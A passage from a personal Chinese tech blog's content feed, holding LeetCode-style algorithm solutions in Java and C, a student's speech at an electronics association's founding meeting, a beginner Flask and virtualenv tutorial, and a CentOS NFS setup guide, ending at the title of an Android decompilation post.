<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> [][] array,<span class="keyword">int</span> target)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> row=<span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> col=array[<span class="number">0</span>].length-<span class="number">1</span>;</div><div class="line">        <span class="keyword">while</span>(row&lt;=array.length-<span class="number">1</span>&amp;&amp;col&gt;=<span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">if</span>(target==array[row][col])</div><div class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(target&gt;array[row][col])</div><div class="line">                row++;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                col--;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="myPow"><a href="#myPow" class="headerlink" title="myPow"></a>myPow</h4><p>LeetCode第2题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>Implement pow(x, n).</p>
<p>Subscribe to see which companies asked this question</p>
<h5 id="解法一-1"><a href="#解法一-1" class="headerlink" title="解法一"></a>解法一</h5><p>用递归方法求n个x的乘积，注意考虑n的正负号，时间复杂度为O(n)。</p>
<p>Leetcode提交超时的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)  </div><div class="line">        <span class="keyword">return</span> <span class="number">1.0</span>;</div><div class="line">    <span class="keyword">if</span>(n&lt;<span class="number">0</span>)  </div><div class="line">        <span class="keyword">return</span> <span class="number">1.0</span>/myPow(x,-n);  </div><div class="line">    <span class="keyword">return</span> x*myPow(x,n<span class="number">-1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h5><p>考虑到n个x相乘式子的对称关系，可采用如下方法：</p>
<p><strong>Leetcode AC的代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)  </div><div class="line">        <span class="keyword">return</span> <span class="number">1.0</span>;</div><div class="line">    <span class="keyword">if</span>(n % <span class="number">2</span> == <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">return</span> myPow(x * x, n / <span class="number">2</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> (n &gt; <span class="number">0</span> ? x : <span class="number">1.0</span> / x ) * myPow(x * x, n / <span class="number">2</span>) ;</div><div class="line">    &#125;  </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>3、Reverse Integer</strong></p>
<p>LeetCode第7题</p>
<p><strong>题目描述：</strong></p>
<p>Reverse digits of an integer.</p>
<p>Example1: x = 123, return 321<br>Example2: x = -123, return -321</p>
<h5 id="一般的思路"><a href="#一般的思路" class="headerlink" title="一般的思路"></a>一般的思路</h5><p>反转整数，只要从低位开始依次取得整数的各个位，然后再按顺序整合成整数即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(x)&#123;</div><div class="line">        num = num*<span class="number">10</span> + x%<span class="number">10</span>;</div><div class="line">        x = x/<span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> num;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但是，此题特别要考虑结果溢出的问题！</p>
<h5 id="LeetcodeAC的代码"><a href="#LeetcodeAC的代码" class="headerlink" title="LeetcodeAC的代码"></a>LeetcodeAC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> num = <span class="number">0</span>,tmp;</div><div class="line">    <span class="keyword">while</span>(x)&#123;</div><div class="line">        tmp = num;</div><div class="line">        num = num*<span class="number">10</span> + x%<span class="number">10</span>;</div><div class="line">        <span class="keyword">if</span>((num-x%<span class="number">10</span>)/<span class="number">10</span> != tmp)    <span class="comment">//判断是否溢出</span></div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        x = x/<span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> num;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="计算字符个数"><a href="#计算字符个数" class="headerlink" title="计算字符个数"></a>计算字符个数</h4><p>牛客网华为机试在线训练第2题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>写出一个程序，接受一个有字母和数字以及空格组成的字符串，和一个字符，然后输出输入字符串中含有该字符的个数。不区分大小写。</p>
<p>输入一个有字母和数字以及空格组成的字符串，和一个字符。</p>
<p>输出输入字符串中含有该字符的个数。</p>
<p>输入例子:<br>ABCDEF<br>A</p>
<p>输出例子:<br>1</p>
<p>此题十分简单，遍历字符串，将目标字符与字符串的每个字符进行比较，相等则计数加1，当然，要注意的是题目中给出的不区分大小写以及获取输入的方法。</p>
<h5 id="牛客网AC的代码"><a href="#牛客网AC的代码" class="headerlink" title="牛客网AC的代码"></a>牛客网AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i,len=<span class="number">0</span>,cnt=<span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> str[<span class="number">1000</span>],c;</div><div class="line">    gets(str);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;c);</div><div class="line">    <span class="keyword">if</span>(c&gt;=<span class="number">65</span>&amp;&amp;c&lt;=<span class="number">90</span>)    <span class="comment">//目标字符如果是字母则转换成小写</span></div><div class="line">       c+=<span class="number">32</span>;</div><div class="line">    len = <span class="built_in">strlen</span>(str);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;</div><div class="line">        <span class="keyword">if</span>(str[i]&gt;=<span class="number">65</span>&amp;&amp;str[i]&lt;=<span class="number">90</span>)  <span class="comment">//字符串中的字符如果是字母则统一转换成小写</span></div><div class="line">            str[i]+=<span class="number">32</span>;</div><div class="line">        <span class="keyword">if</span>(str[i]==c)&#123;  <span class="comment">//进行比较</span></div><div class="line">            cnt++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,cnt);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>第三届电子协会成立大会发言</title>
    <url>/2016/10/23/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%94%B5%E5%AD%90%E5%8D%8F%E4%BC%9A%E6%88%90%E7%AB%8B%E5%A4%A7%E4%BC%9A%E5%8F%91%E8%A8%80/</url>
    <content><![CDATA[<p>　　时光飞逝，电子协会已经走到第三届，作为协会创办和发展的见证者，很高兴看到协会现在的样子，希望协会能够在第三届的带领下越办越好，也希望大家能够将协会的精神一届届地传承下去。我也很荣幸能够受邀作为第二届电子协会的代表在第三届成立大会上发言，以下是发言稿正文。</p>
<a id="more"></a> 
<p>　　尊敬的各位领导、老师，亲爱的同学们，大家晚上好，我是13级信息工程3班的樊振宇，很荣幸能够作为第二届电子协会的代表在这里发言。时光飞逝，转眼一年又过去了，依稀记得第二届电子协会成立大会的场景，去年的成立大会比较简短，今年呢，我们第三届的理事们精心准备，付出了很多，所以也希望我能和大家多分享一点。其实呢，作为协会和实验室的老学长，我对这里已经有很深的感情，所以确实也有很多话想要和大家说。</p>
<p>　　首先，欢迎各位学弟学妹们加入电子协会这个大家庭，也祝贺第三届电子协会在今天成立。我自己是在大一下学期通过学院的实验室宣讲进入了电子设计创新实验室，那个时候电子协会还没有成立。刚进实验室的时候是12级电信2班的欧超学长带的我，他给我提供了很多帮助，也教会了我一些基本的技术，所以我一直也很感谢他。在这个实验室我不仅可以得到丰富的学习资源，还有热情的学长学姐们的指导和帮助，我当时就觉得这就是我理想的实验室。直到14年10月的时候，在实验室几位学长学姐的倡导下，成立了电子协会，成立的初衷也是积聚更多的电子人才，为实验室的发展打下良好的基础，因此，电子协会和电子设计创新实验室是一个有机的整体。</p>
<p>　　从我加入实验室，然后经历第一届、第二届电子协会的发展，再到今天第三届电子协会成立，这一路走来，我自己对于这个实验室和协会的发展也投入了很多的精力和感情，当然，在此期间，我也获得了技术与管理的双重成长，还结识了很多志同道合的朋友，这就是我在这里的一些收获。我也相信，如果大家也能够在协会和实验室一直坚持下去，等到你们大四的时候，一定也会有同样的收获和感触。</p>
<p>　　总结我的大学生活，实验室和协会是非常重要的一部分，也是非常精彩的一部分。深深地记得大二的那个暑假，参加全国电子设计大赛，虽有遗憾，但是一个暑假精心的准备，和指导老师一起四天三夜的连续奋斗至今还历历在目。大学里，你可能会和朋友去KTV通宵嗨唱，也可能会去网吧通宵游戏，但是你很难有机会和老师一起为了比赛而通宵奋斗。另外，我们实验室的小伙伴之间也建立了深厚的友谊，比如我们经常一起打球，有机会还会出去各种浪。总之，这里有学习有奋斗有工作有生活更有快乐，这就是我大学最难忘的实验室时光的一部分，这也是有青春、有活力的电子协会的一部分。虽然现在我们把接力棒交给了第三届的理事们，但是不管以后我们在哪里，我们也会像12级已经毕业的学长学姐们那样，始终关心支持实验室和协会的发展，希望协会的这些优秀的传统能够一届届传递下去。我想，这样一届一届的人才积淀，对于以后实验室和协会成员的考研、找工作或者是创业都会有所帮助，因为我们都来自于电子协会这个大家庭。</p>
<p>　　然后，作为第二届电子协会管理层的代表，我很高兴能够看到电子协会这一年取得的发展。这些成绩的取得来之不易，一方面，离不开实验室和协会各位指导老师的辛勤付出以及学院对我们的关心与支持，特别是匡老师的到来，给我们协会带来了很多实实在在的改变，在她的指导下很多制度都在不断完善，项目团队也在不断地充实，可以说整个实验室和协会的风气都在慢慢转变，另外王老师也加入到我们的团队中来了，相信我们的电子协会一定会发展得越来越顺利。另一方面，也离不开我们协会所有电子人不懈的努力，是大家夜以继日地奋斗，以及辛勤而无私的付出，才能够给实验室培养和输送这么多的人才，然后才能做出这么多的项目，去北京、上海、成都这些地方参加比赛并去的很不错的成绩。</p>
<p>　　最后，我想对第三届电子协会的管理人员说，我相信各位能够做得比我们第二届做得更好，也希望你们能够不忘初心，将这份积聚了几届电子人辛勤付出的事业更好地传承下去，我也衷心地希望第三届电子协会能够再创辉煌。我还想对第三届电子协会的所有学弟学妹们说，电子协会是一个很有活力的集体，有技术精湛而且负责任的指导老师，还有一群热情大方的学长学姐，相信这里将会是你技术梦想开始的地方，也希望大家能够一直坚持下来，最终顺利进入实验室，进行更深入的学习。</p>
<p>　　最后的最后，祝大家在电子协会都能有所收获，也祝愿电子协会能够越办越好。谢谢大家！</p>
<p>　　2016年10月22日</p>
<p>　　 湖南农业大学</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Web 开发框架 Flask</title>
    <url>/2016/10/08/Python%20Web%20%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%20Flask/</url>
    <content><![CDATA[<p>　　Flask是一个使用 Python 编写的轻量级 Web 应用框架。Flask 的设计目标是实现一个 wsgi 的微框架，其核心代码保持简单和可扩展性，很容易学习。Flask是一个易于学习和使用的框架，但是它的功能也是十分强大，后续还会有进一步的学习和总结，这是第一篇 Python Web 的博客。</p>
<a id="more"></a>
<p>　　Flask框架中文版开发文档：<a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="external">http://docs.jinkan.org/docs/flask/</a></p>
<p>　　Flask 依赖两个外部库：Werkzeug 和 Jinja2 。 Werkzeug 是一个 WSGI（在 Web 应用和多种服务器之间的标准 Python 接口) 工具集。Jinja2 负责渲染模板。</p>
<h4 id="virtualenv-–-python虚拟沙盒"><a href="#virtualenv-–-python虚拟沙盒" class="headerlink" title="virtualenv – python虚拟沙盒"></a>virtualenv – python虚拟沙盒</h4><p>　　virtualenv 通过创建独立 Python 开发环境的工具, 来解决依赖、版本以及间接权限问题。简单地说，你可以为每个项目建立不同的/独立的 Python 环境，你将为每个项目安装所有需要的软件包到它们各自独立的环境中。</p>
<h5 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> pip install virtualenv</span></div></pre></td></tr></table></figure>
<p>　　由于权限问题使用sudo临时提升权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo pip install virtualenv</span></div></pre></td></tr></table></figure>
<h5 id="建立并进入虚拟环境"><a href="#建立并进入虚拟环境" class="headerlink" title="建立并进入虚拟环境"></a>建立并进入虚拟环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> mkdir myproject</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> myproject</span></div></pre></td></tr></table></figure>
<h5 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> . venv/bin/activate  <span class="comment">#激活当前virtualenv</span></span></div></pre></td></tr></table></figure>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>（1）执行python程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo python Test.py</span></div></pre></td></tr></table></figure>
<p>（2）访问测试</p>
<p>　　通过浏览器访问如下地址：<a href="http://localhost:5000或者http://127.0.0.1:5000/，就可以看到Hello" target="_blank" rel="external">http://localhost:5000或者http://127.0.0.1:5000/，就可以看到Hello</a> World！</p>
<p>（3）关闭服务器，按 Ctrl+C。</p>
<h5 id="退出虚拟环境"><a href="#退出虚拟环境" class="headerlink" title="退出虚拟环境"></a>退出虚拟环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> deactivate</span></div></pre></td></tr></table></figure>
<h5 id="删除虚拟环境"><a href="#删除虚拟环境" class="headerlink" title="删除虚拟环境"></a>删除虚拟环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> rm -r venv</span></div></pre></td></tr></table></figure>
<h5 id="获取帮助"><a href="#获取帮助" class="headerlink" title="获取帮助"></a>获取帮助</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> virtualenv -h</span></div></pre></td></tr></table></figure>
<h4 id="Flask框架"><a href="#Flask框架" class="headerlink" title="Flask框架"></a>Flask框架</h4><h5 id="安装flask"><a href="#安装flask" class="headerlink" title="安装flask"></a>安装flask</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> pip install flask</span></div></pre></td></tr></table></figure>
<h5 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h5><p>（1）完整的Flask程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>（2）框架说明</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)</div></pre></td></tr></table></figure>
<p>　　以上代码中首先导入了 Flask 类，并得到了该类的的实例 app，这将会是我们的 WSGI 应用程序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></div></pre></td></tr></table></figure>
<p>　　以上代码中 <code>route()</code> 装饰器告诉 Flask 什么样的 URL 能触发我们的函数。即route() 装饰器把一个函数绑定到对应的URL上，这个函数返回我们想要显示在用户浏览器中的信息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
<p>　　以上代码中用 <code>run()</code> 函数来让应用运行在本地服务器上。其中 <code>if __name__ == &#39;__main__&#39;:</code> 确保服务器只会在该脚本被 Python 解释器直接执行的时候才会运行，而不是作为模块导入的时候。</p>
<h5 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h5><p>　　启用了调试支持，服务器会在代码修改后自动重新载入，并在发生错误时提供一个相当有用的调试器。有两种途径来启用调试模式。一种是直接在应用对象上设置:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">app.debug = <span class="keyword">True</span></div><div class="line">app.run()</div></pre></td></tr></table></figure>
<p>　　另一种是作为 run 方法的一个参数传入:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">app.run(debug=<span class="keyword">True</span>)</div></pre></td></tr></table></figure>
<h5 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h5><p>　　<code>route()</code> 装饰器把一个函数绑定到对应的 URL 上。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Index Page'</span></div><div class="line"><span class="comment">#通过http://127.0.0.1:5000访问</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/hello')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></div><div class="line"><span class="comment">#通过http://127.0.0.1:5000/hello访问</span></div></pre></td></tr></table></figure>
<p>　　可以给 URL 添加变量部分，你可以把这些特殊的字段标记为 <code>&lt;variable_name&gt;</code> ， 这个部分将会作为命名参数传递到你的函数。规则可以用 <code>&lt;converter:variable_name&gt;</code>指定一个可选的转换器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">@app.route('/user/&lt;username&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_user_profile</span><span class="params">(username)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'User %s'</span> % username</div><div class="line"><span class="comment">#通过http://127.0.0.1:5000/user/加上名字访问</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">@app.route('/post/&lt;int:post_id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_post</span><span class="params">(post_id)</span>:</span></div><div class="line">    <span class="comment"># show the post with the given id, the id is an integer</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'Post %d'</span> % post_id</div><div class="line"><span class="comment">#通过http://127.0.0.1:5000/post/加上id访问</span></div></pre></td></tr></table></figure>
<p>　　默认情况下，路由只回应 GET 请求，但是通过 <code>route()</code> 装饰器传递 methods 参数可以改变这个行为。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">        do_the_login()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        show_the_login_form()</div></pre></td></tr></table></figure>
<p>　　关于HTTP协议的相关方法请参考博主博客：<a href="http://fanzhenyu.me/2016/08/22/Android%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE/" target="_blank" rel="external">Android网络编程：HTTP协议</a></p>
<p>　　通过以上的学习对于Flask框架应该有了一个基本的认识，后续的博文中还将继续深入学习，敬请关注。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux NFS 服务配置</title>
    <url>/2016/10/05/Linux%20NFS%20%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>　　NFS（Network File System，网络文件系统）是 FreeBSD 支持的文件系统中的一种，它允许网络中的计算机之间通过 TCP/IP 网络共享资源。在NFS的应用中，本地 NFS 的客户端应用可以透明地读写位于远端 NFS 服务器上的文件，就像访问本地文件一样。本博文记录了博主配置 NFS 服务的过程，并测试成功，希望对大家有所帮助。</p>
<a id="more"></a>
<p>　　注：本博客基于CentOS7进行测试，并假设你已经具有一定的Linux操作基础。</p>
<h4 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h4><h5 id="安装必要的包"><a href="#安装必要的包" class="headerlink" title="安装必要的包"></a>安装必要的包</h5><p>　　使用NFS服务需要安装两个包：nfs-utils 和 rpcbind。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">yum install -y nfs-utils</div></pre></td></tr></table></figure>
<p>　　使用yum安装nfs-utils时会自动安装rpcbind</p>
<h5 id="配置-etc-exports文件"><a href="#配置-etc-exports文件" class="headerlink" title="配置/etc/exports文件"></a>配置/etc/exports文件</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">vim /etc/exports</div></pre></td></tr></table></figure>
<p>　　在配置文件中增加内容，每一行分为三部分：</p>
<ul>
<li>本地要共享出去的目录</li>
<li>允许访问的主机（ip或ip段）</li>
<li>权限选项</li>
</ul>
<p>　　例如，写入如下一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/home/fzy/ 192.168.0.1/24(rw,sync,all_squash,anonuid=501,anongid=501)</div></pre></td></tr></table></figure>
<p>　　意思是：把 <code>/home/fzy/</code> 目录共享给ip地址为 192.168.0.1/24 的主机。权限部分特别说明：</p>
<ul>
<li><strong>rw</strong> 表示读/写</li>
<li><strong>ro</strong> 表示只读</li>
<li><strong>sync</strong> 表示数据同步写入内存缓冲区与磁盘中，效率较低，但可以保证数据的一致性（适合于小文件传输）</li>
<li><strong>async</strong> 表示数据先暂时放于内存，而非直接写入硬盘，等到必要时才写入磁盘（适合于大文件传输）</li>
<li><strong>no_root_squash</strong> 表示root用户对这个共享的目录拥有至高的控制权（不安全，不建议使用）</li>
<li><strong>root_squash</strong> 表示root用户对这个共享的目录的权限和普通用户一样。</li>
<li><strong>all_squash</strong> 表示不管使用NFS的用户是谁，其身份都会被限定成一个指定的普通用户。</li>
<li><strong>no_all_squash</strong> 表示所有的普通用户使用nfs都不使用权限压缩（默认设置）</li>
<li><strong>anonuid/anongid</strong> 要和root_squash以及all_squash选项一同使用，用于指定使用NFS的用户被限定后的uid和gid</li>
</ul>
<h5 id="启动NFS服务"><a href="#启动NFS服务" class="headerlink" title="启动NFS服务"></a>启动NFS服务</h5><p>　　在启动nfs前，需先启动rpcbind</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> service rpcbind start</div><div class="line"><span class="meta">$</span> service nfs start</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/10/5-1.png" alt="5-1"></p>
<p>　　虽然上面的命令能够正常启动服务，但是根据提示，我们应该使用如下命令来替换：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> /bin/systemctl start rpcbind.service</div><div class="line"><span class="meta">$</span> /bin/systemctl start nfs.service</div></pre></td></tr></table></figure>
<h5 id="关闭NFS服务"><a href="#关闭NFS服务" class="headerlink" title="关闭NFS服务"></a>关闭NFS服务</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> /bin/systemctl stop rpcbind.service</div><div class="line"><span class="meta">$</span> /bin/systemctl stop nfs.service</div></pre></td></tr></table></figure>
<h4 id="客户端挂载NFS"><a href="#客户端挂载NFS" class="headerlink" title="客户端挂载NFS"></a>客户端挂载NFS</h4><h5 id="查看服务器共享的目录"><a href="#查看服务器共享的目录" class="headerlink" title="查看服务器共享的目录"></a>查看服务器共享的目录</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> showmount -e 服务器ip地址</div></pre></td></tr></table></figure>
<p>会得到如下的结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Export list for 服务器ip地址:</div><div class="line">/home/fzy 客户端ip地址</div></pre></td></tr></table></figure>
<h5 id="在客户端上挂载NFS"><a href="#在客户端上挂载NFS" class="headerlink" title="在客户端上挂载NFS"></a>在客户端上挂载NFS</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> mount -t nfs 服务器ip地址:服务器共享目录  挂载点</div></pre></td></tr></table></figure>
<p>　　其中 <code>-t nfs</code> 指定挂载的类型为 nfs</p>
<h5 id="查看是否挂载成功"><a href="#查看是否挂载成功" class="headerlink" title="查看是否挂载成功"></a>查看是否挂载成功</h5><p>　　命令 df 用于查看已挂载磁盘的总容量、使用容量、剩余容量等。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> df -h</div></pre></td></tr></table></figure>
<p>　　<code>-h</code> 表示使用合适的单位显示。如下图：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/10/5-2.png" alt="5-2"></p>
<h5 id="解除挂载"><a href="#解除挂载" class="headerlink" title="解除挂载"></a>解除挂载</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> umount 已挂载的目录</div></pre></td></tr></table></figure>
<p>　　如果遇到：umount.nfs: 已挂载的目录: device is busy。可以添加 -l 参数，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span> umount -l 已挂载的目录</div></pre></td></tr></table></figure>
<p>　　选项 –l 并不是马上 umount，而是在该目录空闲后再 umount，即延迟卸载。</p>
<h5 id="开机自动挂载"><a href="#开机自动挂载" class="headerlink" title="开机自动挂载"></a>开机自动挂载</h5><p>　　方法一：</p>
<p>　　<code>/etc/fstab</code> 里添加如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">服务器ip地址:共享的目录 客户端挂载点 nfs defaults 1 1</div></pre></td></tr></table></figure>
<p>　　第 1 个 1 表示备份文件系统，第 2 个 1 表示从/分区的顺序开始 fsck 磁盘检测，0 表示不检测.</p>
<p>　　方法二（推荐）：</p>
<p>　　将手动挂载命令加入到 <code>/etc/rc.local</code> 中.</p>
<h4 id="命令exportfs"><a href="#命令exportfs" class="headerlink" title="命令exportfs"></a>命令exportfs</h4><h5 id="命令选项"><a href="#命令选项" class="headerlink" title="命令选项"></a>命令选项</h5><ul>
<li><code>-a</code> 表示全部挂载或者卸载 </li>
<li><code>-r</code> 表示重新挂载</li>
<li><code>-u</code> 表示卸载某一目录</li>
<li><code>-v</code> 表示显示共享的目录</li>
</ul>
<h5 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h5><p>　　<strong>修改配置文件/etc/exports后，使用exportfs命令挂载不需要重启NFS服务</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ exportfs -arv</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>NFS</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 逆向分析之反编译</title>
    <url>/2016/10/03/Android%20%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
